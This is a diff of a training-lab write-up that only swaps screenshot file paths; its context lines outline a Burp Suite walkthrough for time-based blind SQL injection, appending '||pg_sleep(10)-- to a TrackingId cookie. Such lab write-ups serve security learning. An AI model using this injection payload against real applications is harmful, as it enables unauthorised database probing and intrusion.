@@ -14,7 +14,7 @@ step 1
 
 go to proxy => http history => select any Request => then send to repeater
 
-![screnshot](./images/lab14_1.png)
+![screnshot](images/lab14_1.jpg)
 
 step 2
 
@@ -23,10 +23,10 @@ add `'||pg_sleep(10)--`
 TrackingId=H6PEjxCz0hhaCVYE'||pg_sleep(10)--
 ```
 
-![screnshot](./images/lab14_2.png)
+![screnshot](images/lab14_2.jpg)
 
 step 3
 
 Reload page to solve the lab
 
-![screnshot](./images/lab14_3.png)
+![screnshot](images/lab14_3.jpg)
